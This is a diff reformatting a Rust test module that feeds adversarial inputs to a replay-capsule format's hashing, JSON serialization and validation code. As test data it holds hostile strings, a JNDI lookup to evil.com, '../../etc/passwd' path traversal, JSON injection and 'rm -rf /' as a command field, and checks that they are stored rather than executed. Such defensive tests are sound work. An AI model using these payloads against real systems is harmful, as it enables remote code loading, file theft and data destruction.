+                    "Boundary input should be small or empty"
+                );
+                assert!(
+                    input.seq == 0 || input.seq == u64::MAX,
+                    "Should test boundary sequences"
+                );
             }
         }
 
@@ -3801,9 +4282,18 @@ mod tests {
         fn test_capsule_output_hash_collision_and_verification_attacks() {
             // Attack 1: Hash collision attempts using known weak patterns
             let collision_attempts = vec![
-                ("", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"), // SHA256 of empty
-                ("a", "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb"), // SHA256 of 'a'
-                ("abc", "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"), // SHA256 of 'abc'
+                (
+                    "",
+                    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                ), // SHA256 of empty
+                (
+                    "a",
+                    "ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb",
+                ), // SHA256 of 'a'
+                (
+                    "abc",
+                    "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad",
+                ), // SHA256 of 'abc'
             ];
 
             for (i, (data, expected_hash)) in collision_attempts.iter().enumerate() {
@@ -3819,17 +4309,21 @@ mod tests {
 
                 // Test actual SHA256 computation matches expected
                 let computed_hash = hex::encode(Sha256::digest(&hash_output.data));
-                assert_eq!(computed_hash, *expected_hash, "Computed hash should match expected for '{}'", data);
+                assert_eq!(
+                    computed_hash, *expected_hash,
+                    "Computed hash should match expected for '{}'",
+                    data
+                );
             }
 
             // Attack 2: Malformed hash strings to test validation
             let malformed_hashes = vec![
                 "not_a_valid_hex_hash",
-                "deadbeef", // Too short
-                "g".repeat(64), // Invalid hex characters
-                "A".repeat(63), // One character short
-                "B".repeat(65), // One character too long
-                "", // Empty hash
+                "deadbeef",      // Too short
+                "g".repeat(64),  // Invalid hex characters
+                "A".repeat(63),  // One character short
+                "B".repeat(65),  // One character too long
+                "",              // Empty hash
                 "🦀".repeat(16), // Unicode in hash
             ];
 
@@ -3907,7 +4401,7 @@ mod tests {
                 "windows\r\ninjected_line",
                 "very_long_platform_name_".repeat(100),
                 "🦀_platform_with_emoji",
-                "",  // Empty platform
+                "", // Empty platform
             ];
 
             for (i, platform) in malicious_platforms.iter().enumerate() {
@@ -3929,7 +4423,7 @@ mod tests {
                 String::from_utf8_lossy(b"v\x00\x01\xFF\x7F").into_owned(),
                 "999999999.999999999.999999999".to_string(),
                 "version with spaces and \t\n special chars".to_string(),
-                "".to_string(), // Empty version
+                "".to_string(),          // Empty version
                 "version_".repeat(1000), // Very long version
             ];
 
@@ -3948,7 +4442,7 @@ mod tests {
             // Attack 3: Config hash collision and format attacks
             let hash_attacks = vec![
                 "not_a_real_hash".to_string(),
-                "".to_string(),  // Empty hash
+                "".to_string(),   // Empty hash
                 "0".repeat(1000), // Very long fake hash
                 "invalid_hex_chars_ghijk".to_string(),
                 "mixed_CASE_Hash_123".to_string(),
@@ -3973,8 +4467,12 @@ mod tests {
             malicious_properties.insert("normal_key".to_string(), "normal_value".to_string());
             malicious_properties.insert("".to_string(), "empty_key".to_string());
             malicious_properties.insert("key".to_string(), "".to_string());
-            malicious_properties.insert("path_traversal".to_string(), "../../etc/passwd".to_string());
-            malicious_properties.insert("injection".to_string(), "${jndi:ldap://evil.com}".to_string());
+            malicious_properties
+                .insert("path_traversal".to_string(), "../../etc/passwd".to_string());
+            malicious_properties.insert(
+                "injection".to_string(),
+                "${jndi:ldap://evil.com}".to_string(),
+            );
             malicious_properties.insert(
                 "\x00null\x01bytes".to_string(),
                 String::from_utf8_lossy(b"binary_data\xFF\x7F").into_owned(),
@@ -3991,8 +4489,14 @@ mod tests {
 
             // Should preserve all malicious properties without execution
             assert_eq!(props_env.properties.len(), 8);
-            assert_eq!(props_env.properties.get("path_traversal").unwrap(), "../../etc/passwd");
-            assert_eq!(props_env.properties.get("injection").unwrap(), "${jndi:ldap://evil.com}");
+            assert_eq!(
+                props_env.properties.get("path_traversal").unwrap(),
+                "../../etc/passwd"
+            );
+            assert_eq!(
+                props_env.properties.get("injection").unwrap(),
+                "${jndi:ldap://evil.com}"
+            );
 
             // Attack 5: Large property collections to stress memory
             let mut large_properties = BTreeMap::new();
@@ -4015,10 +4519,10 @@ mod tests {
         fn test_replay_capsule_structure_manipulation_and_boundary_attacks() {
             // Attack 1: Format version manipulation
             let version_attacks = vec![
-                0,                    // Zero version
-                u32::MAX,            // Maximum version
-                999999,              // Very high version
-                MIN_FORMAT_VERSION.saturating_sub(1), // Below minimum
+                0,                                           // Zero version
+                u32::MAX,                                    // Maximum version
+                999999,                                      // Very high version
+                MIN_FORMAT_VERSION.saturating_sub(1),        // Below minimum
                 CURRENT_FORMAT_VERSION.saturating_add(1000), // Far future version
             ];
 
@@ -4026,8 +4530,16 @@ mod tests {
                 let version_capsule = ReplayCapsule {
                     capsule_id: "test_id".to_string(),
                     format_version: version,
-                    inputs: vec![CapsuleInput { seq: 1, data: vec![42], metadata: BTreeMap::new() }],
-                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![42], output_hash: "hash".to_string() }],
+                    inputs: vec![CapsuleInput {
+                        seq: 1,
+                        data: vec![42],
+                        metadata: BTreeMap::new(),
+                    }],
+                    expected_outputs: vec![CapsuleOutput {
+                        seq: 1,
+                        data: vec![42],
+                        output_hash: "hash".to_string(),
+                    }],
                     environment: EnvironmentSnapshot {
                         runtime_version: "v1.0.0".to_string(),
                         platform: "linux".to_string(),
@@ -4043,7 +4555,7 @@ mod tests {
 
             // Attack 2: Capsule ID injection and format attacks
             let id_attacks = vec![
-                "".to_string(),  // Empty ID
+                "".to_string(), // Empty ID
                 "../../etc/passwd".to_string(),
                 "${jndi:ldap://evil.com}".to_string(),
                 String::from_utf8_lossy(b"\x00\x01\xFF\x7F").into_owned(), // Binary data
@@ -4057,8 +4569,16 @@ mod tests {
                 let id_capsule = ReplayCapsule {
                     capsule_id: id.clone(),
                     format_version: CURRENT_FORMAT_VERSION,
-                    inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
-                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
+                    inputs: vec![CapsuleInput {
+                        seq: 1,
+                        data: vec![1],
+                        metadata: BTreeMap::new(),
+                    }],
+                    expected_outputs: vec![CapsuleOutput {
+                        seq: 1,
+                        data: vec![1],
+                        output_hash: "h".to_string(),
+                    }],
                     environment: EnvironmentSnapshot {
                         runtime_version: "v1.0.0".to_string(),
                         platform: "linux".to_string(),
@@ -4073,15 +4593,39 @@ mod tests {
 
             // Attack 3: Input/output sequence misalignment attacks
             let misaligned_inputs = vec![
-                CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() },
-                CapsuleInput { seq: 3, data: vec![2], metadata: BTreeMap::new() }, // Gap in sequence
-                CapsuleInput { seq: 2, data: vec![3], metadata: BTreeMap::new() }, // Out of order
-                CapsuleInput { seq: 3, data: vec![4], metadata: BTreeMap::new() }, // Duplicate sequence
+                CapsuleInput {
+                    seq: 1,
+                    data: vec![1],
+                    metadata: BTreeMap::new(),
+                },
+                CapsuleInput {
+                    seq: 3,
+                    data: vec![2],
+                    metadata: BTreeMap::new(),
+                }, // Gap in sequence
+                CapsuleInput {
+                    seq: 2,
+                    data: vec![3],
+                    metadata: BTreeMap::new(),
+                }, // Out of order
+                CapsuleInput {
+                    seq: 3,
+                    data: vec![4],
+                    metadata: BTreeMap::new(),
+                }, // Duplicate sequence
             ];
 
             let misaligned_outputs = vec![
-                CapsuleOutput { seq: 5, data: vec![1], output_hash: "h1".to_string() }, // No matching input
-                CapsuleOutput { seq: 1, data: vec![2], output_hash: "h2".to_string() },
+                CapsuleOutput {
+                    seq: 5,
+                    data: vec![1],
+                    output_hash: "h1".to_string(),
+                }, // No matching input
+                CapsuleOutput {
+                    seq: 1,
+                    data: vec![2],
+                    output_hash: "h2".to_string(),
+                },
             ];
 
             let misaligned_capsule = ReplayCapsule {
@@ -4107,7 +4651,11 @@ mod tests {
                 capsule_id: "empty_inputs".to_string(),
                 format_version: CURRENT_FORMAT_VERSION,
                 inputs: vec![], // Empty inputs
-                expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
+                expected_outputs: vec![CapsuleOutput {
+                    seq: 1,
+                    data: vec![1],
+                    output_hash: "h".to_string(),
+                }],
                 environment: EnvironmentSnapshot {
                     runtime_version: "v1.0.0".to_string(),
                     platform: "linux".to_string(),
@@ -4122,7 +4670,11 @@ mod tests {
             let empty_outputs_capsule = ReplayCapsule {
                 capsule_id: "empty_outputs".to_string(),
                 format_version: CURRENT_FORMAT_VERSION,
-                inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
+                inputs: vec![CapsuleInput {
+                    seq: 1,
+                    data: vec![1],
+                    metadata: BTreeMap::new(),
+                }],
                 expected_outputs: vec![], // Empty outputs
                 environment: EnvironmentSnapshot {
                     runtime_version: "v1.0.0".to_string(),
@@ -4136,21 +4688,21 @@ mod tests {
             assert!(empty_outputs_capsule.expected_outputs.is_empty());
 
             // Attack 5: Large collection stress testing
-            let large_inputs: Vec<CapsuleInput> = (0..10000).map(|i| {
-                CapsuleInput {
+            let large_inputs: Vec<CapsuleInput> = (0..10000)
+                .map(|i| CapsuleInput {
                     seq: i,
                     data: vec![i as u8],
                     metadata: BTreeMap::new(),
-                }
-            }).collect();
+                })
+                .collect();
 
-            let large_outputs: Vec<CapsuleOutput> = (0..10000).map(|i| {
-                CapsuleOutput {
+            let large_outputs: Vec<CapsuleOutput> = (0..10000)
+                .map(|i| CapsuleOutput {
                     seq: i,
                     data: vec![i as u8],
                     output_hash: format!("hash_{}", i),
-                }
-            }).collect();
+                })
+                .collect();
 
             let large_capsule = ReplayCapsule {
                 capsule_id: "large_collections".to_string(),
@@ -4196,15 +4748,24 @@ mod tests {
 
             // Attack 1: Test canonical JSON serialization
             let json_result = to_canonical_json(&base_capsule);
-            assert!(json_result.is_ok(), "Canonical JSON serialization should succeed");
+            assert!(
+                json_result.is_ok(),
+                "Canonical JSON serialization should succeed"
+            );
 
             let json_string = json_result.unwrap();
             assert!(!json_string.is_empty(), "JSON string should not be empty");
-            assert!(json_string.contains("serialization_test"), "JSON should contain capsule ID");
+            assert!(
+                json_string.contains("serialization_test"),
+                "JSON should contain capsule ID"
+            );
 
             // Attack 2: JSON injection through malicious data
             let mut malicious_metadata = BTreeMap::new();
-            malicious_metadata.insert("injection".to_string(), r#"","malicious_field":"injected_value","evil":""#.to_string());
+            malicious_metadata.insert(
+                "injection".to_string(),
+                r#"","malicious_field":"injected_value","evil":""#.to_string(),
+            );
 
             let injection_capsule = ReplayCapsule {
                 capsule_id: r#"test","injected_id":"evil_capsule"#.to_string(),
@@ -4232,19 +4793,22 @@ mod tests {
             assert!(malicious_json.is_ok(), "Should handle malicious content");
             let json_str = malicious_json.unwrap();
             // Malicious content should be properly escaped
-            assert!(!json_str.contains(r#""injected_id":"evil_capsule""#), "Should not contain unescaped injection");
+            assert!(
+                !json_str.contains(r#""injected_id":"evil_capsule""#),
+                "Should not contain unescaped injection"
+            );
 
             // Attack 3: Malformed JSON parsing attempts
             let malformed_json_tests = vec![
-                r#"{"incomplete": json"#,  // Incomplete JSON
-                r#"{"capsule_id": null}"#, // Null values
-                r#"{"format_version": "not_a_number"}"#, // Wrong type
-                r#"{"inputs": "not_an_array"}"#, // Wrong collection type
-                r#"{malformed_json_without_quotes}"#, // Invalid syntax
+                r#"{"incomplete": json"#,                       // Incomplete JSON
+                r#"{"capsule_id": null}"#,                      // Null values
+                r#"{"format_version": "not_a_number"}"#,        // Wrong type
+                r#"{"inputs": "not_an_array"}"#,                // Wrong collection type
+                r#"{malformed_json_without_quotes}"#,           // Invalid syntax
                 r#"{"evil": "value", "injection": "attempt"}"#, // Unknown fields
-                "", // Empty string
-                "not_json_at_all", // Plain text
-                r#"{"capsule_id": "🦀_emoji_test"}"#, // Unicode
+                "",                                             // Empty string
+                "not_json_at_all",                              // Plain text
+                r#"{"capsule_id": "🦀_emoji_test"}"#,           // Unicode
             ];
 
             for malformed in malformed_json_tests {
@@ -4260,7 +4824,8 @@ mod tests {
 
             // Attack 4: Deeply nested JSON structure attacks
             let mut deep_metadata = BTreeMap::new();
-            let nested_json = r#"{"level1":{"level2":{"level3":{"level4":{"level5":"deep_value"}}}}}"#;
+            let nested_json =
+                r#"{"level1":{"level2":{"level3":{"level4":{"level5":"deep_value"}}}}}"#;
             deep_metadata.insert("deep_nesting".to_string(), nested_json.to_string());
 
             let deep_capsule = ReplayCapsule {
@@ -4312,16 +4877,20 @@ mod tests {
         fn test_validation_bypass_and_verification_attacks() {
             // Attack 1: Version compatibility bypass attempts
             let version_tests = vec![
-                (0, false),  // Version 0 should not be supported
+                (0, false), // Version 0 should not be supported
                 (MIN_FORMAT_VERSION, true),
                 (CURRENT_FORMAT_VERSION, true),
                 (CURRENT_FORMAT_VERSION.saturating_add(1), false), // Future version
-                (u32::MAX, false), // Maximum version
+                (u32::MAX, false),                                 // Maximum version
             ];
 
             for (version, expected_support) in version_tests {
                 let is_supported = is_version_supported(version);
-                assert_eq!(is_supported, expected_support, "Version {} support should be {}", version, expected_support);
+                assert_eq!(
+                    is_supported, expected_support,
+                    "Version {} support should be {}",
+                    version, expected_support
+                );
             }
 
             // Attack 2: Validation function bypass through malformed structures
@@ -4330,8 +4899,16 @@ mod tests {
                 ReplayCapsule {
                     capsule_id: "".to_string(),
                     format_version: CURRENT_FORMAT_VERSION,
-                    inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
-                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
+                    inputs: vec![CapsuleInput {
+                        seq: 1,
+                        data: vec![1],
+                        metadata: BTreeMap::new(),
+                    }],
+                    expected_outputs: vec![CapsuleOutput {
+                        seq: 1,
+                        data: vec![1],
+                        output_hash: "h".to_string(),
+                    }],
                     environment: EnvironmentSnapshot {
                         runtime_version: "v1.0.0".to_string(),
                         platform: "linux".to_string(),
@@ -4343,8 +4920,16 @@ mod tests {
                 ReplayCapsule {
                     capsule_id: "test".to_string(),
                     format_version: 0,
-                    inputs: vec![CapsuleInput { seq: 1, data: vec![1], metadata: BTreeMap::new() }],
-                    expected_outputs: vec![CapsuleOutput { seq: 1, data: vec![1], output_hash: "h".to_string() }],
+                    inputs: vec![CapsuleInput {
+                        seq: 1,
+                        data: vec![1],
+                        metadata: BTreeMap::new(),
+                    }],
+                    expected_outputs: vec![CapsuleOutput {
+                        seq: 1,
+                        data: vec![1],
+                        output_hash: "h".to_string(),
+                    }],
                     environment: EnvironmentSnapshot {
                         runtime_version: "v1.0.0".to_string(),
                         platform: "linux".to_string(),
@@ -4357,25 +4942,25 @@ mod tests {
             for capsule in invalid_capsules {
                 let validation_result = validate_capsule(&capsule);
                 // Most invalid capsules should fail validation
-                assert!(validation_result.is_err() || capsule.capsule_id.is_empty(),
-                       "Invalid capsules should fail validation");
+                assert!(
+                    validation_result.is_err() || capsule.capsule_id.is_empty(),
+                    "Invalid capsules should fail validation"
+                );
             }
 
             // Attack 3: Replay function attack through malicious capsules
             let malicious_replay_capsule = ReplayCapsule {
                 capsule_id: "malicious_replay".to_string(),
                 format_version: CURRENT_FORMAT_VERSION,
-                inputs: vec![
-                    CapsuleInput {
-                        seq: 1,
-                        data: "malicious_command".as_bytes().to_vec(),
-                        metadata: {
-                            let mut meta = BTreeMap::new();
-                            meta.insert("command".to_string(), "rm -rf /".to_string());
-                            meta
-                        },
+                inputs: vec![CapsuleInput {
+                    seq: 1,
+                    data: "malicious_command".as_bytes().to_vec(),
+                    metadata: {
+                        let mut meta = BTreeMap::new();
+                        meta.insert("command".to_string(), "rm -rf /".to_string());
+                        meta
                     },
-                ],
+                }],
                 expected_outputs: vec![CapsuleOutput {
                     seq: 1,
                     data: "malicious_output".as_bytes().to_vec(),
@@ -4394,7 +4979,10 @@ mod tests {
             // May succeed or fail, but should not execute malicious commands
             if replay_result.is_ok() {
                 let hash = replay_result.unwrap();
-                assert!(!hash.is_empty(), "Replay hash should not be empty if successful");
+                assert!(
+                    !hash.is_empty(),
+                    "Replay hash should not be empty if successful"
+                );
             }
 
             // Attack 4: Verification bypass through hash manipulation
@@ -4424,8 +5012,10 @@ mod tests {
             if verify_result.is_ok() {
                 let verification_passed = verify_result.unwrap();
                 // With mismatched data/hash, verification should likely fail
-                assert!(!verification_passed || verification_capsule.expected_outputs.is_empty(),
-                       "Verification should fail with mismatched data");
+                assert!(
+                    !verification_passed || verification_capsule.expected_outputs.is_empty(),
+                    "Verification should fail with mismatched data"
+                );
             }
 
             // Attack 5: Resource exhaustion through complex validation
@@ -4467,8 +5057,10 @@ mod tests {
 
             // Should handle complex capsules without resource exhaustion
             let complex_validation = validate_capsule(&complex_capsule);
-            assert!(complex_validation.is_ok() || complex_validation.is_err(),
-                   "Complex validation should complete without crashing");
+            assert!(
+                complex_validation.is_ok() || complex_validation.is_err(),
+                "Complex validation should complete without crashing"
+            );
         }
 
         #[test]
@@ -4529,11 +5121,19 @@ mod tests {
                 assert!(capsule.capsule_id.contains(&i.to_string()));
 
                 if i % 3 == 0 {
-                    assert!(capsule.inputs.len() >= 2, "Should have additional input for iteration {}", i);
+                    assert!(
+                        capsule.inputs.len() >= 2,
+                        "Should have additional input for iteration {}",
+                        i
+                    );
                 }
 
                 if i % 5 == 0 {
-                    assert!(capsule.expected_outputs.len() >= 2, "Should have additional output for iteration {}", i);
+                    assert!(
+                        capsule.expected_outputs.len() >= 2,
+                        "Should have additional output for iteration {}",
+                        i
+                    );
                 }
             }
 
@@ -4558,15 +5158,26 @@ mod tests {
 
                 // Serialize then deserialize rapidly
                 let json_result = to_canonical_json(&cycle_capsule);
-                assert!(json_result.is_ok(), "Serialization should succeed for iteration {}", i);
+                assert!(
+                    json_result.is_ok(),
+                    "Serialization should succeed for iteration {}",
+                    i
+                );
 
                 let json_str = json_result.unwrap();
                 let deserialize_result = from_json(&json_str);
-                assert!(deserialize_result.is_ok(), "Deserialization should succeed for iteration {}", i);
+                assert!(
+                    deserialize_result.is_ok(),
+                    "Deserialization should succeed for iteration {}",
+                    i
+                );
 
                 let roundtrip_capsule = deserialize_result.unwrap();
                 assert_eq!(roundtrip_capsule.capsule_id, cycle_capsule.capsule_id);
-                assert_eq!(roundtrip_capsule.format_version, cycle_capsule.format_version);
+                assert_eq!(
+                    roundtrip_capsule.format_version,
+                    cycle_capsule.format_version
+                );
             }
 
             // Attack 3: State consistency under rapid validation cycles
@@ -4594,7 +5205,11 @@ mod tests {
             // Rapid validation cycles
             for i in 0..100 {
                 let validation_result = validate_capsule(&validation_capsule);
-                assert!(validation_result.is_ok(), "Validation should succeed on iteration {}", i);
+                assert!(
+                    validation_result.is_ok(),
+                    "Validation should succeed on iteration {}",
+                    i
+                );
 
                 // Interleave with other operations
                 if i % 10 == 0 {
